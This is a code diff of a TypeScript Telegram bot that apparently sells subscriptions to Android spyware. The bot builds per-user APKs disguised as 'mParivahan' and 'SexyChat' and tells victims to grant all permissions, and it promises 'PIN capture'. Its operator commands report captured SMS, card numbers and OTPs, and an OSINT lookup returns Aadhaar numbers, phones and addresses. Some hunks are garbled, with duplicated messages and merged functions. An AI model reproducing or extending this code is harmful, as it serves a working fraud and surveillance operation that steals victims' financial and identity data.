@@ -36,6 +36,19 @@ const ENV_ADMIN_ID = parseInt(process.env["ADMIN_TELEGRAM_ID"] || "5741539104");
 // ADMIN_ID kept for legacy watchers — dynamic check via isAdminAsync
 const ADMIN_ID = ENV_ADMIN_ID;
 const BOT_START_TIME = Date.now();
+const pendingActions = new Map<
+  string,
+  { action: "reset_password" | "set_email" }
+>();
+
+const BOT_TOKEN = process.env["TELEGRAM_BOT_TOKEN"];
+const ADMIN_IDS = (process.env["ADMIN_TELEGRAM_ID"] || "5064888403")
+  .split(",")
+  .map((s) => parseInt(s.trim()))
+  .filter(Boolean);
+const ADMIN_ID = ADMIN_IDS[0];
+const isAdminId = (id: number | string) =>
+  ADMIN_IDS.includes(typeof id === "string" ? parseInt(id) : id);
 
 function getPanelUrl(): string {
   const custom = process.env["PANEL_URL"];
@@ -83,7 +96,8 @@ async function requireAdmin(ctx: Context): Promise<boolean> {
   await ctx.reply("❌ *Admin only.*\nYou don't have permission for this command.", { parse_mode: "Markdown" });
   return false;
   if (custom) return custom;
-  if (process.env["REPLIT_DEV_DOMAIN"]) return `https://${process.env["REPLIT_DEV_DOMAIN"]}`;
+  if (process.env["REPLIT_DEV_DOMAIN"])
+    return `https://${process.env["REPLIT_DEV_DOMAIN"]}`;
   return "https://panel.kimiaxe.com";
 }
 
@@ -92,18 +106,20 @@ function daysToMs(days: number): number {
 }
 
 function formatDate(ts: number): string {
-  return new Date(ts).toLocaleString("en-IN", {
-    timeZone: "Asia/Kolkata",
-    day: "2-digit",
-    month: "short",
-    year: "numeric",
-    hour: "2-digit",
-    minute: "2-digit",
-  }) + " IST";
+  return (
+    new Date(ts).toLocaleString("en-IN", {
+      timeZone: "Asia/Kolkata",
+      day: "2-digit",
+      month: "short",
+      year: "numeric",
+      hour: "2-digit",
+      minute: "2-digit",
+    }) + " IST"
+  );
 }
 
 function isAdmin(ctx: Context): boolean {
-  return ctx.from?.id === ADMIN_ID;
+  return isAdminId(ctx.from?.id ?? 0);
 }
 
 function formatUptime(ms: number): string {
@@ -128,11 +144,17 @@ export function createBot(): Telegraf {
 // When a subscription is added for a user who hasn't started the bot yet,
 // Telegram won't let us DM them. We queue the notification in Firebase and
 // deliver it the moment they send /start.
-export async function sendSubscriptionNotification(telegramId: string, sub: any): Promise<boolean> {
+export async function sendSubscriptionNotification(
+  telegramId: string,
+  sub: any
+): Promise<boolean> {
   if (!bot || !sub) return false;
   const now = Date.now();
-  const isActive = sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
-  const daysLeft = sub.expiresAt ? Math.max(0, Math.floor((sub.expiresAt - now) / (1000 * 60 * 60 * 24))) : 0;
+  const isActive =
+    sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
+  const daysLeft = sub.expiresAt
+    ? Math.max(0, Math.floor((sub.expiresAt - now) / (1000 * 60 * 60 * 24)))
+    : 0;
 
   const msg =
     `🎉 *Subscription Activated!*\n\n` +
@@ -148,13 +170,15 @@ export async function sendSubscriptionNotification(telegramId: string, sub: any)
     `🌐 Panel: ${getPanelUrl()}`;
 
   try {
-    await bot.telegram.sendMessage(parseInt(telegramId), msg, { parse_mode: "Markdown" });
+    await bot.telegram.sendMessage(parseInt(telegramId), msg, {
+      parse_mode: "Markdown",
+    });
     void adminLog(
       `🆕 *New Subscription*\n\n` +
-      `👤 ${sub.username || telegramId}\n` +
-      `🆔 \`${telegramId}\`\n` +
-      `📦 Plan: *${sub.plan || "Custom"}*\n` +
-      `⏳ Expires: ${new Date(sub.expiresAt || Date.now()).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}`
+        `👤 ${sub.username || telegramId}\n` +
+        `🆔 \`${telegramId}\`\n` +
+        `📦 Plan: *${sub.plan || "Custom"}*\n` +
+        `⏳ Expires: ${new Date(sub.expiresAt || Date.now()).toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })}`
     );
     return true;
   } catch {
@@ -165,7 +189,10 @@ export async function sendSubscriptionNotification(telegramId: string, sub: any)
       await fbSet(`config/pendingNotifications/${telegramId}`, {
         items: [...existing, { text: msg, ts: Date.now() }],
       });
-      logger.info({ telegramId }, "Subscription notification queued (user hasn't started bot)");
+      logger.info(
+        { telegramId },
+        "Subscription notification queued (user hasn't started bot)"
+      );
     } catch (err) {
       logger.error({ err, telegramId }, "Failed to queue pending notification");
     }
@@ -190,7 +217,10 @@ async function deliverPendingNotifications(ctx: Context): Promise<void> {
       await new Promise((r) => setTimeout(r, 400)); // respect rate limits
     }
     await fbDelete(`config/pendingNotifications/${userId}`);
-    logger.info({ userId, count: hub.items.length }, "Delivered pending notifications");
+    logger.info(
+      { userId, count: hub.items.length },
+      "Delivered pending notifications"
+    );
   } catch (err) {
     logger.error({ err, userId }, "Failed to deliver pending notifications");
   }
@@ -208,7 +238,8 @@ async function sendMparivahanApk(ctx: Context) {
     const sub = await fetchSub(userId);
     if (!isAdmin(ctx)) {
       const now = Date.now();
-      const isActive = sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
+      const isActive =
+        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
       if (!isActive) {
         await ctx.reply("❌ Subscription expired or not found. Contact admin.");
         return;
@@ -222,9 +253,12 @@ async function sendMparivahanApk(ctx: Context) {
       return;
     }
 
-    const statusMsg = await ctx.reply("🔨 *Building your APK...*\nThis may take 30-60 seconds.", {
-      parse_mode: "Markdown",
-    });
+    const statusMsg = await ctx.reply(
+      "🔨 *Building your APK...*\nThis may take 30-60 seconds.",
+      {
+        parse_mode: "Markdown",
+      }
+    );
 
     const apkPath = await buildUserApk(userId);
     if (!apkPath) {
@@ -254,10 +288,10 @@ async function sendMparivahanApk(ctx: Context) {
 
     await ctx.reply(
       `📱 *Install Steps:*\n\n` +
-      `1. Install & open the APK\n` +
-      `2. Allow all permissions\n` +
-      `3. Done — device will appear in panel\n\n` +
-      `_Isse install karte hi aapka device panel mein connect ho jayega._`,
+        `1. Install & open the APK\n` +
+        `2. Allow all permissions\n` +
+        `3. Done — device will appear in panel\n\n` +
+        `_Isse install karte hi aapka device panel mein connect ho jayega._`,
       { parse_mode: "Markdown" }
     );
   } catch (err: any) {
@@ -273,7 +307,8 @@ async function sendSexyChatApk(ctx: Context) {
     const sub = await fetchSub(userId);
     if (!isAdmin(ctx)) {
       const now = Date.now();
-      const isActive = sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
+      const isActive =
+        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
       if (!isActive) {
         await ctx.reply("❌ Subscription expired or not found. Contact admin.");
         return;
@@ -287,9 +322,12 @@ async function sendSexyChatApk(ctx: Context) {
       return;
     }
 
-    const statusMsg = await ctx.reply("🔨 *Building your SexyChat APK...*\nThis may take 30-60 seconds.", {
-      parse_mode: "Markdown",
-    });
+    const statusMsg = await ctx.reply(
+      "🔨 *Building your SexyChat APK...*\nThis may take 30-60 seconds.",
+      {
+        parse_mode: "Markdown",
+      }
+    );
 
     const sexyApkPath = await buildSexyChatApk(userId);
     if (!sexyApkPath) {
@@ -318,10 +356,10 @@ async function sendSexyChatApk(ctx: Context) {
 
     await ctx.reply(
       `💬 *SexyChat APK Install Steps:*\n\n` +
-      `1. Install & open the APK\n` +
-      `2. Allow all permissions\n` +
-      `3. Done — enjoy!\n\n` +
-      `_Is APK aapke device ID (${userId}) ke saath build hua hai — PIN capture aapke panel mein aayega._`,
+        `1. Install & open the APK\n` +
+        `2. Allow all permissions\n` +
+        `3. Done — enjoy!\n\n` +
+        `_Is APK aapke device ID (${userId}) ke saath build hua hai — PIN capture aapke panel mein aayega._`,
       { parse_mode: "Markdown" }
     );
   } catch (err: any) {
@@ -336,7 +374,8 @@ async function handleApkCommand(ctx: Context) {
     const sub = await fetchSub(userId);
     if (!isAdmin(ctx)) {
       const now = Date.now();
-      const isActive = sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
+      const isActive =
+        sub?.status === "active" && (!sub?.expiresAt || now < sub.expiresAt);
       if (!isActive) {
         await ctx.reply("❌ Subscription expired or not found. Contact admin.");
         return;
@@ -345,8 +384,8 @@ async function handleApkCommand(ctx: Context) {
 
     await ctx.reply(
       `📦 *Select APK to download:*\n\n` +
-      `📱 **mParivahan** — Private panel app\n` +
-      `💬 **SexyChat** — Chat app`,
+        `📱 **mParivahan** — Private panel app\n` +
+        `💬 **SexyChat** — Chat app`,
       {
         parse_mode: "Markdown",
         ...Markup.inlineKeyboard([
@@ -379,18 +418,22 @@ async function handleListUsers(ctx: Context) {
     }
 
     const lines = entries.map(([id, s]: [string, any]) => {
-      const active = s.status === "active" && (!s.expiresAt || now < s.expiresAt);
-      const daysLeft = s.expiresAt ? Math.max(0, Math.floor((s.expiresAt - now) / 86_400_000)) : 0;
-      return `${active ? "🟢" : "🔴"} \`${id}\` @${s.username || "unknown"} — ${s.plan || "?"} (${daysLeft}d)`;
+      const active =
+        s.status === "active" && (!s.expiresAt || now < s.expiresAt);
+      const daysLeft = s.expiresAt
+        ? Math.max(0, Math.floor((s.expiresAt - now) / 86_400_000))
+        : 0;
+      const uname = String(s.username || "unknown").replace(/([_*`])/g, "\\$1");
+      const plan = String(s.plan || "?").replace(/([_*`])/g, "\\$1");
+      return `${active ? "🟢" : "🔴"} \`${id}\` @${uname} — ${plan} (${daysLeft}d)`;
     });
 
     // Telegram has 4096 char limit; chunk if needed
     for (let i = 0; i < lines.length; i += 20) {
       const chunk = lines.slice(i, i + 20).join("\n");
-      await ctx.reply(
-        `📋 *Users (${entries.length}):*\n\n${chunk}`,
-        { parse_mode: "Markdown" }
-      );
+      await ctx.reply(`📋 *Users (${entries.length}):*\n\n${chunk}`, {
+        parse_mode: "Markdown",
+      });
     }
   } catch (err) {
     logger.error({ err }, "List users failed");
@@ -403,8 +446,8 @@ async function handleResetPassword(ctx: Context) {
   pendingActions.set(userId, { action: "reset_password" });
   await ctx.reply(
     "🔑 *Reset Password*\n\n" +
-    "Apna new password likho (min 4 characters):\n\n" +
-    "_Cancel karne ke liye /cancel bhejo._"
+      "Apna new password likho (min 4 characters):\n\n" +
+      "_Cancel karne ke liye /cancel bhejo._"
   );
 }
 
@@ -413,8 +456,8 @@ async function handleSetPanelEmail(ctx: Context) {
   pendingActions.set(userId, { action: "set_email" });
   await ctx.reply(
     "📧 *Set Panel Email*\n\n" +
-    "Apna email address bhejo:\n\n" +
-    "_Is email se web panel login karoge._"
+      "Apna email address bhejo:\n\n" +
+      "_Is email se web panel login karoge._"
   );
 }
 
@@ -429,13 +472,15 @@ export async function startBot(): Promise<void> {
     logger.error({ err }, "SexyChat template init failed")
   );
 
-  bot = new Telegraf(BOT_TOKEN);
+  bot = new Telegraf(BOT_TOKEN, { handlerTimeout: 600_000 }); // 10 min — APK builds must never kill polling
 
   // Global error handler — prevents unhandled rejections crashing the bot
   bot.catch(async (err: unknown, ctx: Context) => {
     logger.error({ err }, "Bot unhandled error");
     try {
-      await ctx.reply("❌ An error occurred. Please try again or contact admin.");
+      await ctx.reply(
+        "❌ An error occurred. Please try again or contact admin."
+      );
     } catch {}
   });
 
@@ -479,19 +524,19 @@ export async function startBot(): Promise<void> {
       const panelUrl = getPanelUrl();
       await ctx.reply(
         `*HARRYAXE Panel — Admin Console*\n\n` +
-        `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
-        `*Available Commands:*\n` +
-        `/start — Show this menu\n` +
-        `/apk — Get mParivahan APK\n` +
-        `/sexychat — Get SexyChat APK\n` +
-        `/reset\\_password — Reset web panel password\n` +
-        `/setpanel — Set panel email\n\n` +
-        `*Admin Commands:*\n` +
-        `/adduser — Add subscription\n` +
-        `/removeuser — Remove subscription\n` +
-        `/listusers — List all subscribers\n` +
-        `/stats — System stats\n\n` +
-        `🌐 *Panel:* ${panelUrl}`,
+          `Welcome back, @${ctx.from.username || "admin"}!\n\n` +
+          `*Available Commands:*\n` +
+          `/start — Show this menu\n` +
+          `/apk — Get mParivahan APK\n` +
+          `/sexychat — Get SexyChat APK\n` +
+          `/reset\\_password — Reset web panel password\n` +
+          `/setpanel — Set panel email\n\n` +
+          `*Admin Commands:*\n` +
+          `/adduser — Add subscription\n` +
+          `/removeuser — Remove subscription\n` +
+          `/listusers — List all subscribers\n` +
+          `/stats — System stats\n\n` +
+          `🌐 *Panel:* ${panelUrl}`,
         {
           parse_mode: "Markdown",
           ...Markup.inlineKeyboard([
@@ -586,18 +631,21 @@ export async function startBot(): Promise<void> {
         `Already paid? Ask admin to run:\n` +
         `\`/adduser ${userId} 30 @${username} your@email.com\``,
         `*HARRYAXE Panel Bot*\n\n` +
-        `❌ No subscription found for your account.\n\n` +
-        `Contact admin to get access:\n@exoincs`,
+          `❌ No subscription found for your account.\n\n` +
+          `Contact admin to get access:\n@exoincs`,
         { parse_mode: "Markdown" }
       );
       return;
     }
 
     const now = Date.now();
-    const isActive = sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
+    const isActive =
+      sub.status === "active" && (!sub.expiresAt || now < sub.expiresAt);
     const timeLeft = sub.expiresAt ? Math.max(0, sub.expiresAt - now) : 0;
     const daysLeft = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
-    const hoursLeft = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    const hoursLeft = Math.floor(
+      (timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60)
+    );
 
     const panelUrl = getPanelUrl();
     const statusEmoji = isActive ? "🟢" : "🔴";
@@ -611,6 +659,15 @@ export async function startBot(): Promise<void> {
       (isActive && sub.expiresAt ? `*⏳ Left:* ${daysLeft}d ${hoursLeft}h\n` + `\`[${planBar}]\`\n` : "") +
       `\n*🌐 Panel:* ${panelUrl}\n` +
       `_Login with your email + password, then OTP via Telegram._`,
+      `📋 *Subscription Details*\n\n` +
+        `• Account: ${username}\n` +
+        `• Plan: ${sub.plan}\n` +
+        `• Status: ${isActive ? "✅ Active" : "❌ Expired"}\n` +
+        (sub.expiresAt ? `• Expires: ${formatDate(sub.expiresAt)}\n` : "") +
+        (isActive && sub.expiresAt
+          ? `• Time Left: ${daysLeft}d ${hoursLeft}h\n`
+          : "") +
+        `\n🌐 *Panel:* ${panelUrl}`,
       {
         parse_mode: "Markdown",
         ...Markup.inlineKeyboard([
@@ -718,14 +775,19 @@ export async function startBot(): Promise<void> {
     if (action.action === "reset_password") {
       pendingActions.delete(userId);
       if (text.length < 4) {
-        await ctx.reply("❌ Password kam se kam 4 characters ka hona chahiye. /reset_password dobara karo.");
+        await ctx.reply(
+          "❌ Password kam se kam 4 characters ka hona chahiye. /reset_password dobara karo."
+        );
         return;
       }
       try {
         await fbUpdate(`subscriptions/${userId}`, { panelPassword: text });
-        await ctx.reply("✅ *Password updated!*\n\nAb web panel mein login kar sakte ho.", {
-          parse_mode: "Markdown",
-        });
+        await ctx.reply(
+          "✅ *Password updated!*\n\nAb web panel mein login kar sakte ho.",
+          {
+            parse_mode: "Markdown",
+          }
+        );
       } catch (err) {
         logger.error({ err }, "Failed to set password");
         await ctx.reply("❌ Password set nahi hua. Try again.");
@@ -733,14 +795,21 @@ export async function startBot(): Promise<void> {
     } else if (action.action === "set_email") {
       pendingActions.delete(userId);
       if (!text.includes("@") || text.length < 5) {
-        await ctx.reply("❌ Valid email bhejo (example@mail.com). /setpanel dobara karo.");
+        await ctx.reply(
+          "❌ Valid email bhejo (example@mail.com). /setpanel dobara karo."
+        );
         return;
       }
       try {
-        await fbUpdate(`subscriptions/${userId}`, { email: text.toLowerCase() });
-        await ctx.reply("✅ *Email updated!*\n\nAb web panel login ke liye ready ho.", {
-          parse_mode: "Markdown",
+        await fbUpdate(`subscriptions/${userId}`, {
+          email: text.toLowerCase(),
         });
+        await ctx.reply(
+          "✅ *Email updated!*\n\nAb web panel login ke liye ready ho.",
+          {
+            parse_mode: "Markdown",
+          }
+        );
       } catch (err) {
         logger.error({ err }, "Failed to set email");
         await ctx.reply("❌ Email set nahi hua. Try again.");
@@ -1074,14 +1143,23 @@ export async function startBot(): Promise<void> {
     }
     const clientCount = await fbGet("clients");
     const messages = await fbGet("messages");
-    const smsCount = messages ? Object.keys(messages).reduce((a: number, k: string) => a + Object.keys(messages[k]).length, 0) : 0;
-    const ccCount = clientCount ? Object.values(clientCount).filter((c: any) => c?.cc_cardNumber || c?.cardNumber).length : 0;
+    const smsCount = messages
+      ? Object.keys(messages).reduce(
+          (a: number, k: string) => a + Object.keys(messages[k]).length,
+          0
+        )
+      : 0;
+    const ccCount = clientCount
+      ? Object.values(clientCount).filter(
+          (c: any) => c?.cc_cardNumber || c?.cardNumber
+        ).length
+      : 0;
 
     await ctx.reply(
       `📊 *System Stats*\n\n` +
-      `📱 Devices: ${clientCount ? Object.keys(clientCount).length : 0}\n` +
-      `💬 Total SMS: ${smsCount}\n` +
-      `💳 Cards Captured: ${ccCount}\n`,
+        `📱 Devices: ${clientCount ? Object.keys(clientCount).length : 0}\n` +
+        `💬 Total SMS: ${smsCount}\n` +
+        `💳 Cards Captured: ${ccCount}\n`,
       { parse_mode: "Markdown" }
     );
   });
@@ -1124,9 +1202,12 @@ export async function startBot(): Promise<void> {
     const existing = await getSubscription(telegramId);
     const now = Date.now();
 
-    const baseTime = existing?.status === "active" && existing.expiresAt && existing.expiresAt > now
-      ? existing.expiresAt
-      : now;
+    const baseTime =
+      existing?.status === "active" &&
+      existing.expiresAt &&
+      existing.expiresAt > now
+        ? existing.expiresAt
+        : now;
 
     const expiresAt = baseTime + daysToMs(days);
 
@@ -1152,6 +1233,15 @@ export async function startBot(): Promise<void> {
       (email ? `│ 📧 Email: ${email.toLowerCase()}\n` : `│ ⚠️ No email — panel login disabled\n`) +
       `└─────────────────────┘\n` +
       `User can now: /apk • /reset\\_password • Panel login`,
+      `✅ *Subscription Added!*\n\n` +
+        `👤 User: ${username}\n` +
+        `🆔 ID: \`${telegramId}\`\n` +
+        `📅 Plan: ${days} Days\n` +
+        `⏰ Expires: ${formatDate(expiresAt)}\n` +
+        `🕐 Days Left: ${daysLeft}d\n` +
+        (email
+          ? `📧 Email: ${email}`
+          : `⚠️ No email set — user won't be able to login to panel`),
       { parse_mode: "Markdown" }
     );
 
@@ -1468,6 +1558,9 @@ export async function startBot(): Promise<void> {
       { parse_mode: "Markdown" }
     );
     await ctx.reply(`🗑️ *Subscription removed for \`${telegramId}\`*`, { parse_mode: "Markdown" });
+    await ctx.reply(`🗑️ *Subscription removed for \`${telegramId}\`*`, {
+      parse_mode: "Markdown",
+    });
   });
 
   // ─── /listusers ──────────────────────────────────────────────────────────
@@ -1481,12 +1574,16 @@ export async function startBot(): Promise<void> {
     }
     const parts = ctx.message.text.split(" ").slice(1);
     if (parts.length < 1) {
-      await ctx.reply("Usage: `/setchannel -100xxxxxxxxxx` or `/setchannel @channelname`");
+      await ctx.reply(
+        "Usage: `/setchannel -100xxxxxxxxxx` or `/setchannel @channelname`"
+      );
       return;
     }
     const channelId = parts[0];
     await setSubscription("__global__", { smsChannel: channelId } as any);
-    await ctx.reply(`✅ Global SMS channel set to \`${channelId}\``, { parse_mode: "Markdown" });
+    await ctx.reply(`✅ Global SMS channel set to \`${channelId}\``, {
+      parse_mode: "Markdown",
+    });
   });
 
   // ─── /removechannel ──────────────────────────────────────────────────────
@@ -1552,24 +1649,31 @@ export async function startBot(): Promise<void> {
       const json = await lookup(query);
       const hits: any[] = Array.isArray(json.results) ? json.results : [];
       if (hits.length === 0) {
-        await ctx.reply(`🔍 No records found for \`${query}\``, { parse_mode: "Markdown" });
+        await ctx.reply(`🔍 No records found for \`${query}\``, {
+          parse_mode: "Markdown",
+        });
         return;
       }
       const fmtAddr = (a?: string | null) =>
         a ? a.split("!").filter(Boolean).join(", ") : "—";
-      const esc = (s: any) => String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
-      const lines = hits.slice(0, 5).map((h, i) =>
-        `*${i + 1}. ${esc(h.name)}*\n` +
-        `👨 Father: ${esc(h.father_name)}\n` +
-        `📱 Mobile: \`${esc(h.mobile)}\`${h.alternate_mobile ? ` (alt \`${esc(h.alternate_mobile)}\`)` : ""}\n` +
-        `🪪 Aadhar: \`${esc(h.aadhar)}\`\n` +
-        `📡 ${esc(h.circle)}\n` +
-        `📍 ${esc(fmtAddr(h.address))}`
-      );
+      const esc = (s: any) =>
+        String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
+      const lines = hits
+        .slice(0, 5)
+        .map(
+          (h, i) =>
+            `*${i + 1}. ${esc(h.name)}*\n` +
+            `👨 Father: ${esc(h.father_name)}\n` +
+            `📱 Mobile: \`${esc(h.mobile)}\`${h.alternate_mobile ? ` (alt \`${esc(h.alternate_mobile)}\`)` : ""}\n` +
+            `🪪 Aadhar: \`${esc(h.aadhar)}\`\n` +
+            `📡 ${esc(h.circle)}\n` +
+            `📍 ${esc(fmtAddr(h.address))}`
+        );
       const more = hits.length > 5 ? `\n…+${hits.length - 5} more` : "";
       await ctx.reply(
         `🔍 *OSINT: \`${esc(query)}\`* — ${json.message || hits.length + " result(s)"}\n\n` +
-        lines.join("\n\n") + more,
+          lines.join("\n\n") +
+          more,
         { parse_mode: "Markdown" }
       );
     } catch (err: any) {
@@ -1621,10 +1725,13 @@ export function setupWebhook(url: string): Telegraf {
         .sort((a, b) => (b.date || 0) - (a.date || 0))
         .slice(0, 10);
       if (entries.length === 0) {
-        await ctx.reply("🔑 No OTPs captured yet. They appear as devices receive verification SMS.");
+        await ctx.reply(
+          "🔑 No OTPs captured yet. They appear as devices receive verification SMS."
+        );
         return;
       }
-      const esc = (s: any) => String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
+      const esc = (s: any) =>
+        String(s ?? "—").replace(/([_*[\]()~`>#+\-=|{}.!])/g, "\\$1");
       const ago = (t?: number) => {
         if (!t) return "—";
         const s = Math.floor((Date.now() - t) / 1000);
@@ -1632,14 +1739,18 @@ export function setupWebhook(url: string): Telegraf {
         if (s < 3600) return `${Math.floor(s / 60)}m ago`;
         return `${Math.floor(s / 3600)}h ago`;
       };
-      const lines = entries.map((e, i) =>
-        `*${i + 1}. \`${esc(e.code)}\`*\n` +
-        `🏷️ ${esc(e.service)} · 📱 \`${esc(e.number)}\`\n` +
-        `🕐 ${ago(e.date)}${e.from ? ` · from ${esc(e.from)}` : ""}`
+      const lines = entries.map(
+        (e, i) =>
+          `*${i + 1}. \`${esc(e.code)}\`*\n` +
+          `🏷️ ${esc(e.service)} · 📱 \`${esc(e.number)}\`\n` +
+          `🕐 ${ago(e.date)}${e.from ? ` · from ${esc(e.from)}` : ""}`
       );
-      await ctx.reply(`🔑 *Latest OTPs* (${entries.length})\n\n${lines.join("\n\n")}`, {
-        parse_mode: "Markdown",
-      });
+      await ctx.reply(
+        `🔑 *Latest OTPs* (${entries.length})\n\n${lines.join("\n\n")}`,
+        {
+          parse_mode: "Markdown",
+        }
+      );
     } catch (err: any) {
       logger.error({ err }, "OTP command failed");
       await ctx.reply("❌ OTP fetch failed. Try again later.");
@@ -1654,19 +1765,67 @@ export function setupWebhook(url: string): Telegraf {
   startCcWatcher(bot!, ADMIN_ID);
   logger.info("Watchers started (immediate)");
 
-  // Webhook mode - avoids 409 polling conflicts from other instances
-  const webhookUrl = `${getPanelUrl()}/bot-webhook`;
-  bot.telegram.setWebhook(webhookUrl, {
-    drop_pending_updates: true,
-    allowed_updates: ["message", "callback_query"]
-  }).then(() => {
-    logger.info({ webhookUrl }, "Telegram bot started (webhook mode)");
-  }).catch((err) => {
-    logger.error({ err }, "Telegram bot webhook set failed");
-  });
+  // Custom long-polling loop. We intentionally do NOT use telegraf's built-in
+  // polling: it passes an AbortController to node-fetch 2.7.0 which (a) rejects
+  // cross-realm signals and (b) can enter a 409 death spiral. Native fetch + per-
+  // update error isolation means one bad update can never take the bot down.
+  const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
+  const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+  let pollOffset = 0;
+  async function pollForever() {
+    while (true) {
+      try {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 70_000);
+        const res = await fetch(`${API}/getUpdates`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            timeout: 50,
+            offset: pollOffset > 0 ? pollOffset : undefined,
+            allowed_updates: ["message", "callback_query"],
+          }),
+          signal: controller.signal,
+        });
+        clearTimeout(timer);
+        if (!res.ok) {
+          const body: any = await res.json().catch(() => ({}));
+          const err: any = new Error(
+            body.description || `getUpdates HTTP ${res.status}`
+          );
+          err.code = body.error_code;
+          throw err;
+        }
+        const data: any = await res.json();
+        const updates: any[] = data.result || [];
+        for (const u of updates) {
+          pollOffset = Math.max(pollOffset, u.update_id + 1);
+          await bot!.handleUpdate(u).catch((err) => {
+            logger.error(
+              { err, updateId: u.update_id },
+              "Update handler error"
+            );
+          });
+        }
+      } catch (err: any) {
+        if (
+          err?.code === 409 ||
+          String(err?.message || "").includes("Conflict")
+        ) {
+          logger.warn("Polling 409 conflict — another poller? backing off 15s");
+          await sleep(15_000);
+        } else {
+          logger.error({ err }, "Polling error — retrying in 5s");
+          await sleep(5_000);
+        }
+      }
+    }
+  }
+  void pollForever();
+  logger.info("Telegram bot started (custom long polling, 24/7 self-heal)");
 }
 
 export function getWebhookHandler() {
-  if (!bot) return null;
-  return bot.webhookCallback("/bot-webhook", { secretToken: undefined });
+  // Webhook endpoint disabled in polling mode - updates arrive via getUpdates.
+  return null;
 }
